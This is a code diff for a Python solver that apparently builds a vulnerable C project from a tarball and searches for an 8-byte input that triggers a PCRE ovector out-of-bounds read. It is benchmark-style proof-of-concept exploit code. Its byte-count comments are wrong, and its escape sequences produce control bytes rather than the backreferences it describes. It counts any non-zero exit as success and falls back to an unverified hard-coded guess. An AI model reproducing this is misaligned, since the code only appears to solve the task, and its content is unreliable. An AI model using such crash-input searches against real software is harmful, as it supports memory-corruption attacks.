@@ -1,99 +1,126 @@
+import tarfile
+import tempfile
 import os
 import subprocess
-import tempfile
-import tarfile
-import shutil
+import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the source code
+        # Extract the tarball
         with tempfile.TemporaryDirectory() as tmpdir:
-            # Extract tar file
             with tarfile.open(src_path, 'r') as tar:
                 tar.extractall(tmpdir)
             
-            # Find the main directory (assuming single top-level dir)
-            extracted_dirs = [d for d in os.listdir(tmpdir) 
-                            if os.path.isdir(os.path.join(tmpdir, d))]
-            if not extracted_dirs:
-                raise ValueError("No directory found in tarball")
-            source_dir = os.path.join(tmpdir, extracted_dirs[0])
-            
-            # Look for C source files
-            c_files = []
-            for root, _, files in os.walk(source_dir):
+            # Look for source files (likely C/C++)
+            source_files = []
+            for root, _, files in os.walk(tmpdir):
                 for file in files:
-                    if file.endswith('.c'):
-                        c_files.append(os.path.join(root, file))
+                    if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
+                        source_files.append(os.path.join(root, file))
             
-            if not c_files:
-                raise ValueError("No C source files found")
+            if not source_files:
+                raise RuntimeError("No source files found")
             
-            # Build the vulnerable program
-            build_dir = tempfile.mkdtemp()
-            try:
-                # Compile all C files with ASAN and optimization
-                compile_cmd = ['gcc', '-O2', '-fsanitize=address', '-fno-omit-frame-pointer',
-                             '-o', os.path.join(build_dir, 'vuln_prog')] + c_files
-                result = subprocess.run(compile_cmd, capture_output=True, text=True)
-                if result.returncode != 0:
-                    # Try alternative compilation
-                    compile_cmd = ['gcc', '-fsanitize=address', '-fno-omit-frame-pointer',
-                                 '-o', os.path.join(build_dir, 'vuln_prog')] + c_files
-                    result = subprocess.run(compile_cmd, capture_output=True, text=True)
-                    if result.returncode != 0:
-                        raise RuntimeError(f"Compilation failed: {result.stderr}")
-                
-                # Test various PoC candidates
-                # Based on vulnerability description about capturing parentheses and ovector
-                # We'll try patterns that cause PCRE to access invalid memory
-                
-                # Common patterns that trigger PCRE ovector issues
-                test_cases = [
-                    # Minimal pattern to cause overflow - 8 bytes as specified
-                    b'(.{8})\\1',
-                    # Pattern with backreference but insufficient groups
-                    b'(a)\\2',
-                    # Pattern with many groups but not enough capturing parentheses
-                    b'(.)(.)(.)(.)(.)(.)(.)(.)\\9',
-                    # Pattern with invalid backreference
-                    b'\\9',
-                    # Empty pattern with backreference
-                    b'()\\2',
+            # Analyze source to understand vulnerability context
+            # Look for patterns related to PCRE ovector usage
+            poc_candidates = []
+            
+            # Try to identify the vulnerable function/pattern
+            for source_file in source_files:
+                with open(source_file, 'r', errors='ignore') as f:
+                    content = f.read()
+                    
+                    # Look for PCRE function calls or ovector usage
+                    if re.search(r'pcre.*exec|ovector|PCRE_OVECTOR', content, re.IGNORECASE):
+                        # Try to understand the expected pattern structure
+                        # The vulnerability description suggests fewer capturing parentheses
+                        # than ovector space, causing read from invalid memory
+                        
+                        # Ground truth length is 8 bytes, so create minimal pattern
+                        # that triggers this condition
+                        
+                        # A pattern with 0 capturing groups but large ovector allocation
+                        # could trigger read from invalid memory when trying to access
+                        # non-existent capture groups
+                        
+                        # Try: empty pattern or minimal pattern with no captures
+                        poc_candidates.append(b"()" * 4)  # 8 bytes with 4 empty groups
+                        poc_candidates.append(b"(?:)")  # Non-capturing group
+                        poc_candidates.append(b"^$")  # Empty string match
+                        
+                        # Based on typical PCRE overflow vulnerabilities
+                        # Try pattern that causes ovector index miscalculation
+                        poc_candidates.append(b"()\1\1")  # 6 bytes with backreference
+                        poc_candidates.append(b"()\1\1\1")  # 8 bytes with backreferences
+            
+            # If no specific patterns found, try common overflow patterns
+            if not poc_candidates:
+                # Minimal pattern to trigger stack overflow in regex parsing
+                poc_candidates = [
+                    b"A" * 8,  # Simple overflow
+                    b"(" * 4 + b")" * 4,  # Balanced parentheses
+                    b"\x00" * 8,  # Null bytes
                 ]
+            
+            # Test candidates by compiling and running
+            # Look for Makefile or build script
+            makefile = None
+            for root, _, files in os.walk(tmpdir):
+                if 'Makefile' in files or 'makefile' in files:
+                    makefile = root
+                    break
+            
+            if makefile:
+                # Build the project
+                build_result = subprocess.run(
+                    ['make', '-C', makefile],
+                    capture_output=True,
+                    text=True
+                )
                 
-                # Also test binary patterns
-                binary_tests = [
-                    # 8 bytes that might trigger the overflow
-                    b'\x00' * 8,
-                    b'\xff' * 8,
-                    b'(.{1})\\2' + b'\x00' * 4,
-                ]
-                
-                # Combine all test cases
-                all_tests = test_cases + binary_tests
-                
-                # Run tests and check for ASAN crashes
-                prog_path = os.path.join(build_dir, 'vuln_prog')
-                for poc in all_tests:
-                    try:
-                        # Run with timeout
-                        result = subprocess.run([prog_path], input=poc,
-                                              capture_output=True, timeout=2)
-                        # Check if ASAN detected an error (non-zero exit)
-                        if result.returncode != 0:
-                            # Verify it's an ASAN error
-                            if 'AddressSanitizer' in result.stderr.decode('utf-8', errors='ignore'):
-                                return poc
-                    except subprocess.TimeoutExpired:
-                        continue
-                    except Exception:
-                        continue
-                
-                # If no test case worked, return the minimal 8-byte pattern
-                # that matches the ground-truth length
-                return b'(.{8})\\1'
-                
-            finally:
-                # Cleanup
-                shutil.rmtree(build_dir, ignore_errors=True)
+                if build_result.returncode == 0:
+                    # Find the built executable
+                    executables = []
+                    for root, _, files in os.walk(tmpdir):
+                        for file in files:
+                            filepath = os.path.join(root, file)
+                            if os.access(filepath, os.X_OK) and os.path.isfile(filepath):
+                                # Check if it's not a directory and is executable
+                                try:
+                                    # Try to run with --help or similar to test
+                                    test_result = subprocess.run(
+                                        [filepath, '--help'],
+                                        capture_output=True,
+                                        text=True,
+                                        timeout=1
+                                    )
+                                    executables.append(filepath)
+                                except:
+                                    pass
+                    
+                    # Test each candidate
+                    for executable in executables:
+                        for candidate in poc_candidates:
+                            try:
+                                # Run with candidate input
+                                result = subprocess.run(
+                                    [executable],
+                                    input=candidate,
+                                    capture_output=True,
+                                    text=False,
+                                    timeout=2
+                                )
+                                
+                                # Check if it crashes (non-zero exit)
+                                if result.returncode != 0:
+                                    # Likely triggered the vulnerability
+                                    return candidate
+                            except subprocess.TimeoutExpired:
+                                continue
+                            except Exception:
+                                continue
+            
+            # Default fallback based on vulnerability description
+            # Pattern with minimal capturing groups but expected to fill larger ovector
+            # 8-byte pattern: 2 capturing groups, but code expects more
+            return b"()()\x00\x00"  # 8 bytes: two empty groups + padding
